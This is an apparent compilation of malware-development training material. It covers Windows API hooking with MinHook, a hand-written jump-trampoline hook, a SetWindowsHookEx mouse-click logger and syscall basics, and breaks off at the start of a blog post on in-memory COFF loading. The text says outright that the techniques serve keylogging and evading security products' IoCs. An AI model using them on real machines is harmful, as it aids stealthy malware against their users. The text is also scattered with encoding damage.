		printf("[!] MH_CreateHook Failed With Error : %d \n", dwMinHookErr);
		return FALSE;
	}
	
	// Enabling the hook on MessageBoxA
	if ((dwMinHookErr = MH_EnableHook(&MessageBoxA)) != MH_OK) {
		printf("[!] MH_EnableHook Failed With Error : %d \n", dwMinHookErr);
		return -1;
	}

	return TRUE;
}
```

  

### Minhook UnHooking Routine

Unlike the Detours library, the Minhook library does not require the use of transactions. Instead, to remove a hook, the only requirement is to run the??`MH_DisableHook`??API with the address of the hooked function. The??`MH_Uninitialize`??call is optional, but it cleans up the structure initialized with the previous??`MH_Initialize`??call.

```c
BOOL Unhook() {
	
	DWORD 	dwMinHookErr = NULL;

	if ((dwMinHookErr = MH_DisableHook(&MessageBoxA)) != MH_OK) {
		printf("[!] MH_DisableHook Failed With Error : %d \n", dwMinHookErr);
		return -1;
	}

	if ((dwMinHookErr = MH_Uninitialize()) != MH_OK) {
		printf("[!] MH_Uninitialize Failed With Error : %d \n", dwMinHookErr);
		return -1;
	}
}
```

### The Main Function

The hooking and unhooking routines previously shown do not include a main function. The main function is shown below which simply invokes the unhooked and hooked versions of??`MessageBoxA`.

```c
int main() {

	//  will run
	MessageBoxA(NULL, "What Do You Think About Malware Development ?", "Original MsgBox", MB_OK | MB_ICONQUESTION);

	//  hooking
	if (!InstallHook())
		return -1;

	//  wont run - hooked
	MessageBoxA(NULL, "Malware Development Is Bad", "Original MsgBox", MB_OK | MB_ICONWARNING);

	//  unhooking
	if (!Unhook()) 
		return -1;

	//  will run - hook disabled
	MessageBoxA(NULL, "Normal MsgBox Again", "Original MsgBox", MB_OK | MB_ICONINFORMATION);

	return 0;
}

```

### Demo

Running the first MessageBoxA (Unhooked)

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/minhook-113692839-29b30634-f82b-49a1-9bbc-9a27277431b2.png)

  

Running the second MessageBoxA (Hooked)

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/minhook-213692909-51d8413a-eb9a-44a3-b59c-a43fc6fa5113.png)

  

Running the third MessageBoxA (Unhooked)

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/minhook-313692968-0b322f31-7913-48b2-95bf-15e5088aa0af.png)
# 6.9 API Hooking - Custom Code

### Introduction

So far, open source libraries have been used to implement API hooking. However, a major issue with this approach is that the source code for these libraries is publicly available, making it straightforward for security researchers and security product vendors to build IoCs. For this reason, API hooking will be implemented manually in this module, although not as sophisticated as the previously demonstrated libraries, but enough to achieve the desired result without IoCs.

Custom hooking code can be a better option if the intent is to hook a single function. This avoids the additional effort of linking other libraries, and avoiding the additional weight these libraries add to the binary's size.

### Creating The Trampoline Shellcode

One of the ways to hook a function is to overwrite its first few instructions with new ones. These new instructions are the trampoline which is responsible for altering the execution flow of the function to the replacement function. This trampoline is typically a small jump shellcode that executes a??`jmp`??instruction to the address of the function to be executed. To execute the??`jmp`??instruction, the address that needs to be jumped to must be saved inside of a register. In the presented example, the register will be??`eax`??on a 32-bit processor and??`r10`??on a 64-bit processor. A??`mov`??instruction will be used to save the address inside of these registers.

This is all that is needed for the trampoline, a??`mov`??and a??`jmp`??instruction. Diving deeper into how these instructions are used is not the focus of this module. If one would like to explore them further,??[felixcloutier.com/x86/mov](https://www.felixcloutier.com/x86/mov)??and??[felixcloutier.com/x86/jmp](https://www.felixcloutier.com/x86/jmp)??can provide more details.

#### 64-bit Jump Shellcode

The 64-bit jump shellcode should be as follows:

```c
mov r10, pAddress  
jmp r10
```

Where??`pAddres`??is the address of the function to jump to (e.g.??`0x0000FFFEC32A300`). To use these instructions in the code they must first be converted to??_opcode_.

```c
0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, pAddress
0x41, 0xFF, 0xE2                                            // jmp r10
```

#### 32-bit Jump Shellcode

And the 32-bit version:

```c
mov eax, pAddress  
jmp eax
```

Again, convert the instructions to opcode.

```c
0xB8, 0x00, 0x00, 0x00, 0x00,     // mov eax, pAddress
0xFF, 0xE0                        // jmp eax
```

Note that??`pAddress`??is represented as??`NULL`, which explains the??`0x00`??sequence. These??`0x00`??opcodes are placeholders that will be overwritten during runtime.

### Retrieving pAddress

Since the hooks are installed during runtime, the??`pAddress`??value must be retrieved and added to the shellcode during runtime. The retrieval of the address can be done using??`GetProcAddress`??and once that's completed,??`memcpy`??is used to copy the address to the correct location in the shellcode.

#### 64-bit Patching

```c
uint8_t		uTrampoline[] = {
			0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, pFunctionToRun
			0x41, 0xFF, 0xE2                                            // jmp r10
};

uint64_t uPatch = (uint64_t)pAddress;
memcpy(&uTrampoline[2], &uPatch, sizeof(uPatch)); // copying the address to the offset '2' in uTrampoline
```

#### 32-bit Patching

```c
uint8_t		uTrampoline[] = {
	   0xB8, 0x00, 0x00, 0x00, 0x00,     // mov eax, pFunctionToRun
	   0xFF, 0xE0                        // jmp eax
};
  
uint32_t uPatch = (uint32_t)pAddress;
memcpy(&uTrampoline[1], &uPatch, sizeof(uPatch)); // copying the address to the offset '1' in uTrampoline
```

As previously mentioned,??`pAddress`??is the address of the function to jump to. The??`uint32_t`??and??`uint64_t`??data types are used to ensure that the address is the correct number of bytes, that is 4 bytes for 32-bit machines and 8 bytes for 64-bit machines.??`uint32_t`??is of size 4 bytes, and??`uint64_t`??is of size 8 bytes.??`memcpy`??will then place the address into the trampoline by overwriting the??`0x00`??placeholder bytes.

### Writing The Trampoline

Before overwriting the target function's first few instructions with the prepared shellcode, it is important to mark the memory where the trampoline will be written as writable. In most cases, the memory region will not be writable, requiring the??`VirtualProtect`??WinAPI to change the memory permissions to??`PAGE_EXECUTE_READWRITE`. It is worth noting that it must be writable and executable because when the program calls the function, it needs to execute instructions that will not be permitted on write-only memory.

With that in mind, the trampoline should first modify the permissions of the target function and then copy the shellcode over.

```c
// Changing the memory permissons at 'pFunctionToHook' to be PAGE_EXECUTE_READWRITE
if (!VirtualProtect(pFunctionToHook, sizeof(uTrampoline), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
	return FALSE;
}

// Copying the trampoline shellcode to 'pFunctionToHook'
memcpy(pFunctionToHook, uTrampoline, sizeof(uTrampoline));
```

Where??`pFunctionToHook`??is the address of the function to hook, and??`uTrampoline`??is the jump shellcode.

### Unhooking

When the hooked function is called, the trampoline shellcode should be able to work for both 64-bit and 32-bit architectures. However, the unhooking of the hooked function has not been discussed. To do this, the original bytes which were overwritten by the trampoline should be restored by using a buffer containing these bytes that were created prior to the installation of the trampoline shellcode. This buffer should then be used as the source buffer in the??`memcpy`??function when unhooking the function.

```c
memcpy(pFunctionToHook, pOriginalBytes, sizeof(pOriginalBytes));
```

Where??`pFunctionToHook`??is the address of the hooked function and??`pOriginalBytes`??is the buffer that's holding the original bytes of the function which should have been saved before hooking, and can be done via a??`memcpy`??call. The size of the??`pOriginalBytes`??buffer should be the same as the trampoline shellcode size that way only the shellcode is overwritten. Lastly, it's recommended to revert the memory permissions which can be done via the code snippet below.

```c
if (!VirtualProtect(pFunctionToHook, sizeof(uTrampoline), dwOldProtection, &dwOldProtection)) {
	return FALSE;
}
```

Where??`dwOldProtection`??is the old memory permission returned by the first??`VirtualProtect`??call.

### HookSt Structure

To make the implementation easier, the??`HookSt`??structure was created. This structure will contain the needed information to hook and unhook a certain function. The value??`TRAMPOLINE_SIZE`??is set to??_13_??if the program is set to be compiled as a 64-bit application, and its set to??_7_??if the program is to be compiled in 32-bit mode. The values 13 and 7 are the sizes of the trampoline shellcode, denoted in the??`uTrampoline`??variable previously shown, in 64-bit and 32-bit systems, respectively.

```c
typedef struct _HookSt{

	PVOID	pFunctionToHook;                  // address of the function to hook
	PVOID	pFunctionToRun;                   // address of the function to run instead
	BYTE	pOriginalBytes[TRAMPOLINE_SIZE];  // buffer to keep some original bytes (needed for cleanup)
	DWORD	dwOldProtection;                  // holds the old memory protection of the "function to hook" address (needed for cleanup)

}HookSt, *PHookSt;
```

Setting the??`TRAMPOLINE_SIZE`??value is done via the following preprocessor code

```c
// if compiling as 64-bit
#ifdef _M_X64
#define TRAMPOLINE_SIZE		13
#endif // _M_X64

// if compiling as 32-bit
#ifdef _M_IX86
#define TRAMPOLINE_SIZE		7
#endif // _M_IX86
```

### Installing Hooks

The following function uses??`HookSt`??to install hooks.

```c
BOOL InstallHook (IN PHookSt Hook) {

#ifdef _M_X64
	// 64-bit trampoline
	uint8_t	uTrampoline [] = {
			0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, pFunctionToRun
			0x41, 0xFF, 0xE2                                            // jmp r10
	};

	// Patching the shellcode with the address to jump to (pFunctionToRun)
	uint64_t uPatch = (uint64_t)(Hook->pFunctionToRun);
	// Copying the address of the function to jump to, to the offset '2' in uTrampoline
	memcpy(&uTrampoline[2], &uPatch, sizeof(uPatch));
#endif // _M_X64


#ifdef _M_IX86
	// 32-bit trampoline
	uint8_t	uTrampoline[] = {
	   0xB8, 0x00, 0x00, 0x00, 0x00,     // mov eax, pFunctionToRun
	   0xFF, 0xE0                        // jmp eax
	};
	
	// Patching the shellcode with the address to jump to (pFunctionToRun)
	uint32_t uPatch = (uint32_t)(Hook->pFunctionToRun);
	// Copying the address of the function to jump to, to the offset '1' in uTrampoline
	memcpy(&uTrampoline[1], &uPatch, sizeof(uPatch));
#endif // _M_IX86

	
	// Placing the trampoline function - installing the hook
	memcpy(Hook->pFunctionToHook, uTrampoline, sizeof(uTrampoline));

	return TRUE;
}

```

### Removing Hooks

The function below uses??`HookSt`??to remove hooks.

```c
BOOL RemoveHook (IN PHookSt Hook) {

	DWORD	dwOldProtection		= NULL;

	// Copying the original bytes over
	memcpy(Hook->pFunctionToHook, Hook->pOriginalBytes, TRAMPOLINE_SIZE);
	// Cleaning up our buffer
	memset(Hook->pOriginalBytes, '\0', TRAMPOLINE_SIZE);
	// Setting the old memory protection back to what it was before hooking 
	if (!VirtualProtect(Hook->pFunctionToHook, TRAMPOLINE_SIZE, Hook->dwOldProtection, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Setting all to null
	Hook->pFunctionToHook   = NULL;
	Hook->pFunctionToRun    = NULL;
	Hook->dwOldProtection   = NULL;

	return TRUE;
}

```

#### Populating The HookSt Structure

The??`InitializeHookStruct`??function is used to populate the??`HookSt`??structure with the necessary information to perform hooking.

```c
BOOL InitializeHookStruct(IN PVOID pFunctionToHook, IN PVOID pFunctionToRun, OUT PHookSt Hook) {

	// Filling up the struct
	Hook->pFunctionToHook   = pFunctionToHook;
	Hook->pFunctionToRun    = pFunctionToRun;

	// Save original bytes of the same size that we will overwrite (that is TRAMPOLINE_SIZE)
	// This is done to be able to do cleanups when done
	memcpy(Hook->pOriginalBytes, pFunctionToHook, TRAMPOLINE_SIZE);

	// Changing the protection to RWX so that we can modify the bytes 
	// We are saving the old protection to the struct (to re-place it at cleanup)
	if (!VirtualProtect(pFunctionToHook, TRAMPOLINE_SIZE, PAGE_EXECUTE_READWRITE, &Hook->dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
```

#### The Main function

The main function below calls the previously demonstrated functions and hooks the??`MessageBoxA`??WinAPI.

```c
int main() {

	// Initializing the structure (needed before installing/removing the hook)
	HookSt st = { 0 };

	if (!InitializeHookStruct(&MessageBoxA, &MyMessageBoxA, &st)) {
		return -1;
	}

	// will run
	MessageBoxA(NULL, "What Do You Think About Malware Development ?", "Original MsgBox", MB_OK | MB_ICONQUESTION);

	//  hooking
	if (!InstallHook(&st)) {
		return -1;
	}
	
	//  wont run - hooked
	MessageBoxA(NULL, "Malware Development Is Bad", "Original MsgBox", MB_OK | MB_ICONWARNING);


	//  unhooking
	if (!RemoveHook(&st)) {
		return -1;
	}


	//  will run - hook disabled
	MessageBoxA(NULL, "Normal MsgBox Again", "Original MsgBox", MB_OK | MB_ICONINFORMATION);


	return 0;
}
```

  

### Demo

Due to the trampoline-based hook, it is impossible to have a global original function pointer be called to resume execution. Therefore, the??`MessageBoxW`??WinAPI will be called in the??`MyMessageBoxA`??detour function.

Running the first??`MessageBoxA`??(Unhooked).

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/custom-trampoline-113731211-c0c71ee9-93b5-4e56-811e-b9595193062f.png)  

The original??`MessageBoxA`??instructions before hooking.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/custom-trampoline-213732622-0d251a96-90b6-43fa-ae02-6bc14b0b6c3e.png)  

Running the second??`MessageBoxA`??(Hooked).

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/custom-trampoline-313731997-b35bff75-14b3-4b32-96d7-913132055062.png)  

The trampoline shellcode is in memory.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/custom-trampoline-413732637-5e2985c7-2bda-4e75-98c4-9ea6e8c1798b.png)  

Running the third??`MessageBoxA`??(Unhooked).

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/custom-trampoline-513732042-e95b475c-72ed-4797-b8e5-4d7cb545f209.png)
# 7.0 API Hooking - Using Windows APIs

### Introduction

The??[SetWindowsHookEx](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexw)??WinAPI call is an alternate method of API hooking. It is mainly employed to keep track of certain types of system events, which is distinct from the techniques used in earlier modules, as??`SetWindowsHookExW/A`??does not modify the functionality of a function, instead it executes a callback function whenever a certain event is triggered. The type of events is limited to those provided by Windows.

### SetWindowsHookEx Usage

The??`SetWindowsHookExW`??WinAPI is shown below.

```c
HHOOK SetWindowsHookExW(
  [in] int       idHook,      // The type of hook procedure to be installed
  [in] HOOKPROC  lpfn,        // A pointer to the hook procedure (function to execute)
  [in] HINSTANCE hmod,        // Handle to the DLL containing the hook procedure (this is kept as NULL)
  [in] DWORD     dwThreadId   // A thread Id with which the hook procedure is to be associated with (this is kept as NULL)
);
```

- `idHook`??- The event that will be monitored. For example, the??`WH_KEYBOARD_LL`??flag is used to monitor keystroke messages which can act as a keylogger. Note that using??`SetWindowsHookEx`??to perform keylogging is an old trick. For this module, the??`WH_MOUSE_LL`??flag will be used to monitor mouse clicks.
    
- `lpfn`??- A pointer to the callback function that executes whenever the specified event occurs. In this case, the function will execute whenever there is a mouse click.
    

#### Callback Function

The callback function should be of type??`HOOKPROC`, which is shown below.

```c
typedef LRESULT (CALLBACK* HOOKPROC)(int nCode, WPARAM wParam, LPARAM lParam);
```

Therefore a callback function should be defined like the function below.

```c
LRESULT HookCallbackFunc(int nCode, WPARAM wParam, LPARAM lParam){
  // function's code
}
```

The callback function should also use the??[CallNextHookEx](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callnexthookex)??WinAPI and return its output.??`CallNextHookEx`??passes the hook information to the next hook procedure in the hook chain. In other words, it will pass the hook's information to the callback function the next time it is executed.

The callback function is updated to include??`CallNextHookEx`.

```c
LRESULT HookCallbackFunc(int nCode, WPARAM wParam, LPARAM lParam){
  // Function's code
   
  return CallNextHookEx(NULL, nCode, wParam, lParam)
}
```

Based on Microsoft's??[Remark section](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callnexthookex#remarks), calling??`CallNextHookEx`??is optional but highly recommended. Otherwise, other applications that have installed hooks will not receive hook notifications and may behave incorrectly.

Finally, the last part is the callback function's code. The code will be monitoring the action therefore in this example the function is checking what mouse button was clicked via the following code.

```c
LRESULT HookCallbackFunc(int nCode, WPARAM wParam, LPARAM lParam){
    
    if (wParam == WM_LBUTTONDOWN){
        printf("[ # ] Left Mouse Click \n");
    }
    
    if (wParam == WM_RBUTTONDOWN) {
        printf("[ # ] Right Mouse Click \n");
    }
    
    if (wParam == WM_MBUTTONDOWN) {
        printf("[ # ] Middle Mouse Click \n");
    }
   
  return CallNextHookEx(NULL, nCode, wParam, lParam)
}
```

### Processing Messages

Having obtained the code required to monitor the user's mouse clicks, the next step is to ensure that the hooking process is maintained. This is achieved by executing the monitoring code over a specific period. To do so,??`SetWindowsHookExW`??is called within a thread, which is kept active for the desired duration using the??`WaitForSingleObject`??WinAPI.

```c
// The callback function that will be executed whenever the user clicks a mouse button
LRESULT HookCallback(int nCode, WPARAM wParam, LPARAM lParam){

    if (wParam == WM_LBUTTONDOWN){
        printf("[ # ] Left Mouse Click \n");
    }
    
    if (wParam == WM_RBUTTONDOWN) {
        printf("[ # ] Right Mouse Click \n");
    }
    
    if (wParam == WM_MBUTTONDOWN) {
        printf("[ # ] Middle Mouse Click \n");
    }
    
    // moving to the next hook in the hook chain
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


BOOL MouseClicksLogger(){
    
    // Installing hook 
    HHOOK hMouseHook = SetWindowsHookExW(
        WH_MOUSE_LL,
        (HOOKPROC)HookCallback,
        NULL,   
        NULL
    );
    if (!hMouseHook) {
        printf("[!] SetWindowsHookExW Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Keeping the thread running
    while(1){
    
    }
    
    return TRUE;
}


int main() {
  
    HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MouseClicksLogger, NULL, NULL, NULL);
    if (hThread)
        WaitForSingleObject(hThread, 10000); // Monitor mouse clicks for 10 seconds

    return 0;
}
```

### Improving The Implementation

The issue with the prior code was that the while loop fails to process hooked mouse messages, which resulted in a laggy mouse movement on the target machine. To resolve this issue, it is necessary to process all message events using??[DefWindowProc](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-defwindowprocw). This will ensure that the event is properly handled by the system and that any associated default behavior is carried out.??`DefWindowProcW`??calls the default window procedure to provide default processing for any window messages that an application does not process.

To get the message's details,??[GetMessageW](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getmessagew)??must be called first, which retrieves a message from the calling thread's message queue. This message is then passed to??`DefWindowProcW`, which will process it.??`GetMessageW`??returns the message information in an??[MSG structure](https://learn.microsoft.com/en-us/windows/win32/api/winuser/ns-winuser-msg)??which includes everything required for the following??`DefWindowProcW`??call.

All of this should be performed within a loop to ensure every unprocessed message is manually handled.

```c
// The callback function that will be executed whenever the user clicked a mouse button
LRESULT HookCallback(int nCode, WPARAM wParam, LPARAM lParam){

    if (wParam == WM_LBUTTONDOWN){
        printf("[ # ] Left Mouse Click \n");
    }
    
    if (wParam == WM_RBUTTONDOWN) {
        printf("[ # ] Right Mouse Click \n");
    }
    
    if (wParam == WM_MBUTTONDOWN) {
        printf("[ # ] Middle Mouse Click \n");
    }
    
    // Moving to the next hook in the hook chain
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


BOOL MouseClicksLogger(){
    
    MSG         Msg         = { 0 };

    // Installing hook 
    HHOOK hMouseHook = SetWindowsHookExW(
        WH_MOUSE_LL,
        (HOOKPROC)HookCallback,
        NULL,   
        NULL
    );
    if (!hMouseHook) {
        printf("[!] SetWindowsHookExW Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Process unhandled events
    while (GetMessageW(&Msg, NULL, NULL, NULL)) {
        DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
    }
    
    return TRUE;
}


int main() {
  
    HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MouseClicksLogger, NULL, NULL, NULL);
    if (hThread)
        WaitForSingleObject(hThread, 10000); // Monitor mouse clicks for 10 seconds

    return 0;
}
```

### Removing Hooks

To remove any hook installed by the??`SetWindowsHookEx`??function, the??[UnhookWindowsHookEx](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-unhookwindowshookex)??WinAPI must be called.??`UnhookWindowsHookEx`??only takes a handle to the hook to be removed.

### SetWindowsHookEx Hooking Code

The code snippet below puts everything discussed in this module to perform hooking on mouse click events and then removes the hook.

```c
// Global hook handle variable
HHOOK g_hMouseHook      = NULL;


// The callback function that will be executed whenever the user clicked a mouse button
LRESULT HookCallback(int nCode, WPARAM wParam, LPARAM lParam){

    if (wParam == WM_LBUTTONDOWN){
        printf("[ # ] Left Mouse Click \n");
    }
    
    if (wParam == WM_RBUTTONDOWN) {
        printf("[ # ] Right Mouse Click \n");
    }
    
    if (wParam == WM_MBUTTONDOWN) {
        printf("[ # ] Middle Mouse Click \n");
    }
    
    // Moving to the next hook in the hook chain
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


BOOL MouseClicksLogger(){
    
    MSG         Msg         = { 0 };

    // Installing hook 
    g_hMouseHook = SetWindowsHookExW(
        WH_MOUSE_LL,
        (HOOKPROC)HookCallback,
        NULL,   
        NULL
    );
    if (!g_hMouseHook) {
        printf("[!] SetWindowsHookExW Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Process unhandled events
    while (GetMessageW(&Msg, NULL, NULL, NULL)) {
        DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
    }
    
    return TRUE;
}


int main() {
  
    HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MouseClicksLogger, NULL, NULL, NULL);
    if (hThread)
        WaitForSingleObject(hThread, 10000); // Monitor mouse clicks for 10 seconds
    
    // Unhooking
    if (g_hMouseHook && !UnhookWindowsHookEx(g_hMouseHook)) {
        printf("[!] UnhookWindowsHookEx Failed With Error : %d \n", GetLastError());
    }
    return 0;
}
```

### Demo

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/windows-hooks-1223195943-e2c26fe0-45e5-4ef2-b10c-fcadf1933528.png)
# 7.1 Syscalls - Introduction

### What Are Syscalls

Windows system calls or syscalls serve as an interface for programs to interact with the system, enabling them to request specific services such as reading or writing to a file, creating a new process, or allocating memory. Recall from the introductory modules that syscalls are the APIs that carry out the actions when a WinAPI function is called. For example, the??`NtAllocateVirtualMemory`??syscall is triggered when either??`VirtualAlloc`??or??`VirtualAllocEx`??WinAPIs functions are called. This syscall then moves the parameters provided by the user in the previous function call to the Windows kernel, carries out the requested action and returns the result to the program.

All syscalls return an??[NTSTATUS Value](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55)??that indicates the error code.??`STATUS_SUCCESS`??(zero) is returned if the syscall succeeds in performing the operation.

The majority of syscalls are not documented by Microsoft, therefore the syscall modules will reference the documentation shown below.

- [Undocumented NTinternals](https://web.archive.org/web/20230401045934/http://undocumented.ntinternals.net/)
    
- [ReactOS's NTDLL Reference](https://doxygen.reactos.org/dir_a7ad942ac829d916497d820c4a26c555.html)
    

### NTDLL & Syscalls

The majority of syscalls are exported from the??`ntdll.dll`??DLL.

### Why Use Syscalls

Using system calls provides low-level access to the operating system, which can be advantageous for executing actions that are not available or more complex to accomplish with standard WinAPIs. For example, the??`NtCreateUserProcess`??syscall provides additional options when creating processes that??`CreateProcess`??WinAPI can't.

Additionally, syscalls can be used for evading host-based security solutions which will be discussed in upcoming modules.

### Zw vs Nt Syscalls

There are two types of syscalls, ones that start with??`Nt`??and others with??`Zw`.

NT syscalls are the primary interface for user-mode programs. These are the system calls that are typically used by most Windows programs.

`Zw`??syscalls on the other hand are a low-level, kernel-mode interface to the operating system. They are typically used by device drivers and other kernel-mode code that needs direct access to the operating system's functionality.

To summarize,??`Zw`??syscalls are used in kernel mode in device driver development, whereas the??`Nt`??system calls are executed from user-mode programs. Although it is possible to use both from user mode programs and still achieve the same result. This can be noticed in the below images, where both the??`Zw`??and??`Nt`??versions of the same syscall share the same function address.

![3113](https://maldevacademy.s3.amazonaws.com/images/Intermediate/syscalls-intro-113904478-7d2bf6e7-ee44-4a3e-8100-28e26d0fe0d1.png)

![3223](https://maldevacademy.s3.amazonaws.com/images/Intermediate/syscalls-intro-213904491-110e794d-616f-4239-8a0a-96c2d2be77df.png)

For the sake of simplicity in this course, only??`Nt`??system calls will be used.

### Syscall Service Number

Every syscall has a special syscall number, which is known as??_System Service Number_??or??_SSN_. These syscall numbers are what the kernel uses to distinguish syscalls from each other. For example, the??`NtAllocateVirtualMemory`??syscall will have an SSN of 24 whereas??`NtProtectVirtualMemory`??will have an SSN of 80, these numbers are what the kernel uses to differentiate??`NtAllocateVirtualMemory`??from??`NtProtectVirtualMemory`.

#### Differing SSNs By OS

It is important to be aware that SSNs will differ depending on the OS (e.g. Windows 10 vs 11) and within the version itself (e.g. Windows 11 21h2 vs Windows 11 22h2). Using the same example mentioned above,??`NtAllocateVirtualMemory`??may have an SSN of 24 on one version of Windows whereas on another version it will be 34. The same would apply to??`NtProtectVirtualMemory`??as well as the rest of the syscalls.

#### Syscalls In Memory

Within a machine, SSNs are not completely arbitrary and have a relation to one another. Each syscall number in memory is equal to the previous SSN + 1. For example, the SSN of syscall B is equal to the SSN of syscall A plus one. This is also true when approaching the syscall from the other end, where the SSN of syscall C will be that of syscall D minus one.

This relation is shown in the following image where the SSN of??`ZwAccessCheck`??is 0 and the SSN of the next syscall,??`NtWorkerFactoryWorkerReady`??is 1 and so on.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/syscall-intro-221095509-588e2694-4323-4de4-a929-01a0fc209ff0.png)

Understanding that the syscalls have a relation to one another will come in handy for evasion purposes in upcoming syscall modules.

### Syscall Structure

The syscall structure is generally the same and will look like the snippet shown below.

```c
mov r10, rcx
mov eax, SSN
syscall
```

For example,??`NtAllocateVirtualMemory`??on a 64-bit system is shown below.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/syscalls-intro-313903469-08ed9596-55bd-4c09-b39b-dc1f8e169d49.png)

And??`NtProtectVirtualMemory`??is shown below.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/syscalls-intro-413903414-69957a37-e317-4913-aa29-d9720b6f9eb4.png)

### Syscall Instructions Explained

The first line of the syscall moves the first parameter value, saved in??`RCX`, to the??`R10`??register. Subsequently, the SSN of the syscall is moved to the??`EAX`??register. Finally, the special??`syscall`??instruction is executed.

The??`syscall`??instruction on 64-bit systems or??`sysenter`??on 32-bit systems, are the instructions that initiate the system call. Executing the??`syscall`??instruction will cause the program to transfer control from user mode to kernel mode. The kernel will then perform the requested action and return control to the user mode program when completed.

#### Test & Jne Instructions

The??`test`??and??`jne`??instructions are for??[WoW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/wow64-implementation-details)??purposes which are meant to allow 32-bit processes to run on a 64-bit machine. These instructions do not affect the execution flow when the process is a 64-bit process.

### Not All NtAPIs Are Syscalls

It is important to note that while some NtAPIs return??`NTSTATUS`, they are not necessarily syscalls. These NtAPIs may instead be lower-level functions that are used by WinAPIs or syscalls. The reason why certain NtAPIs are not classified as syscalls is due to their non-compliance with the structure of a syscall, such as not having a syscall number or the lack of the usual??`mov r10, rcx`??instruction at the start. An example of NtAPIs that are not syscalls is shown below.

- `LdrLoadDll`??- This is used by the??`LoadLibrary`??WinAPI to load an image to the calling process.
    
- `SystemFunction032`??and??`SystemFunction033`??- These NtAPIs were introduced earlier and perform RC4 encryption/decryption operations.
    
- `RtlCreateProcessParametersEx`??- This is used by the??`CreateProcess`??WinAPI to create arguments of a process.
    

#### LdrLoadDll

`LdrLoadDll`'s instructions are shown below. Notice how it does not follow the typical syscall structure.

![image](https://maldevacademy.s3.amazonaws.com/images/Intermediate/syscall-intro-321109035-b09edb7e-5ecb-4c6f-96d5-de081603d047.png)
# Malware development part 8 - COFF injection and in-memory execution

## Introduction

This is the eigth post of a series which regards the development of malicious software. In this series we will explore and try to implement multiple techniques used by malicious applications to execute code, hide from defenses and persist.  
This time we will implement a COFF object file loader, which is similar to??[BOF (beacon object file) feature of Cobalt Strike](https://www.cobaltstrike.com/help-beacon-object-files). This has been also tackled by??[TrustedSec](https://www.trustedsec.com/blog/coffloader-building-your-own-in-memory-loader-or-how-to-run-bofs/).

The code is in??[my GitHub repo](https://github.com/0xpat/COFFInjector).

Note: We are working with 64-bit code here.

## C code compilation

Generating an executable from C/C++ source code is a three-step process:

1. Preprocessing - interpretation of precompiler directives (merging??`#include`d files, replacing??`#define`d identifiers). Precompiler basically replaces text in the source code to produce a translation unit.
2. Compilation (at which we took a detailed look in part 6). Compiler generates assembly from source code and creates an object file.
3. Linking - combining object files and needed libraries into the final executable (which can also be a DLL).

An executable can be either natively executed by OS loader or injected into memory (for example via process hollowing or any other applicable technique).

But what if we could execute object files? Actually this is possible, since these files contain the actual machine code we???re interesed in.

## COFF object files

Common Object File Format is a executable code format originating from Unix. Microsoft created their own variant of COFF and PE format based on that. [Microsoft documentation] contains a miture of information regarding COFF and PE file formats.

Object files produced by Visual Studio compiler use COFF format. Such an object file (with??`.obj`??extension) contains:

- header (with architecture information, timestamp, number of sections and symbols and others),
- sections (with assembly, debug information, linker directives, exceptions information, static data etc.),
- symbols (like functions and variables) table with information about their location.

Sections may contain relocation information which specifies how section data should be modified by linker and then during loading into memory. For example??`.text`??section with assembly has information specifying what parts of code should be replaced and what should they reference in memory. More on that later.

We need to browse the COFF file contents and extract assembly along with relocation data and perform relocations. The final code (with relocations applied) can be executed by just calling it as a function (`((void(*)())(code))()`) or with (for example with??`CreateThread`).

### Example object file

Let???s consider a very simple console application:

```
int main()
{
	MessageBoxA(NULL, "Content", "Title", NULL);
	return 0;
}
```

`MessageBoxA`??function is located in??`user32.dll`??- we need to hint the linker about that.

> Normally,??`.lib`??files are static libraries containing code (actually object files) that can be statically linked to an executable. However with dynamic linking linker uses special??`.lib`??files which point to relevant dynamic libraries - this information is used by linker to build the Import Address Table of an executable.

This can be done either by changing the project options in Visual Studio or using the following directive:

`#pragma comment(lib, "user32.lib")`

> I disabled compiler optimization (`/Od`) for this piece of code. Enabling optimization resulted in different data arrangement in the object file and caused problems with my PoC COFF loader. Further testing would be required.

